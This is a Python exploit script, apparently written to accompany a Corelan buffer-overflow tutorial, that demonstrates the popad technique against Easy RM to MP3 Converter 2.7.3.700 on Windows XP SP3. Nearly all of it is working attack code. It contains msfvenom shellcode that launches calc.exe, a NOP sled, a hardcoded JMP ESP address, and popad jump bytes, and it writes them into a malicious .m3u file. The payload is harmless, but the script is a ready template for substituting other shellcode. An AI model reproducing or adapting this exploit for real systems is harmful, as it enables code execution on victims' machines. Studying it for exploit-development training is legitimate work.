#!/usr/bin/env python
#
# Exploit Title   : py-sploit6-popad.py
# Exploit Author  : wetw0rk
# Version         : Easy RM to MP3 Converter 2.7.3.700
# Tested on       : Windows XP SP3
# Description     : An example of the popad technique.
#
# Tutorial Link :
#     https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/
#
# Original Exploit:
#     https://www.exploit-db.com/exploits/10374/
#

import struct

# msfvenom -a x86 --platform windows -p windows/exec
# CMD=calc.exe -f python -b "\x00\x09\x0a" --smallest
buf =  ""
buf += "\x2b\xc9\xb1\xc0\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c"
buf += "\x0e\x07\xe2\xfa\xfd\xea\x81\x04\x05\x06\x67\x81\xec"
buf += "\x3b\xcb\x68\x86\x5e\x3f\x9b\x43\x1e\x98\x46\x01\x9d"
buf += "\x65\x30\x16\xad\x51\x3a\x2c\xe1\xb3\x1c\x40\x5e\x21"
buf += "\x08\x05\xe7\xe8\x25\x28\xed\xc9\xde\x7f\x79\xa4\x62"
buf += "\x21\xb9\x79\x08\xbe\x7a\x26\x40\xda\x72\x3a\xed\x6c"
buf += "\xb5\x66\x60\x40\x91\xc8\x0d\x5d\xa5\x7d\x01\xc2\x7e"
buf += "\xc0\x4d\x9b\x7f\xb0\xfc\x90\x9d\x5e\x55\x92\x6e\xb7"
buf += "\x2d\xaf\x59\x26\xa4\x66\x23\x7b\x15\x85\x3a\xe8\x3c"
buf += "\x41\x67\xb4\x0e\xe2\x66\x20\xe7\x35\x72\x6e\xa3\xfa"
buf += "\x76\xf8\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d\x24\x24"
buf += "\x2e\x7f\x61\xdd\xdc\xde\x0e\x94\x6c\x05\xd4\xe0\x8a"
buf += "\x01\x08\x3c\x8f\x90\x91\xc2\xfb\xa5\x1e\xf9\x10\x67"
buf += "\x4c\x21\x6b\x29\x3f\xc8\xf7\x06\x34\x1f\x3e\x5b\x70"
buf += "\x9a\xa1\xd4\xa3\x2a\x50\x4c\xd8\xab\x14\xf7\xa2\xc0"
buf += "\xdc\xde\xb5\xe5\x48\x6d\xda\xdb\xd7\xdf\x93\xdb\xc7"
buf += "\xa5\xc1"

file = "tunes.m3u"		# file containing evil buffer

buffer_size = 35041		# buffer size needed to overwrite eip
junk	= 'A'*26360		# offset before shellcode
sled	= "\x90"*50		# NOP sled for padding (we want to land here)

rest	= "A"*(buffer_size - (	# fill up the rest of the buffer
		len(junk)+	# so that we can overwrite eip
		len(sled)+	# this will be placed directly
		len(buf)))	# after our shellcode.

eip	= struct.pack('<L', 0x01a8f23a)	# JMP ESP (MSRMCcodec02.dll)

pre     = "X" * 4		# [esp+4] needed to point to our jumpcode
pre	+= "\x61" * 9		# 9 popads (So we point to shellcode) (assuming 17 byte buffer)
pre	+= "\xff\xe4"		# 10th and 11th byte, jmp esp
pre	+= "\x90\x90\x90"	# fill the rest with nops

garbage = "D" * 100		# pretend we need to jump over this

print "[+] setting up our evil buffer"
print "[+] address in eip will be 0x%08x" % (0x01a8f23a)
evil = junk + sled + buf + rest + eip + pre + garbage
print "[+] writing evil buffer to %s" % (file)
fd = open(file, 'w')
fd.write(evil)
fd.close()
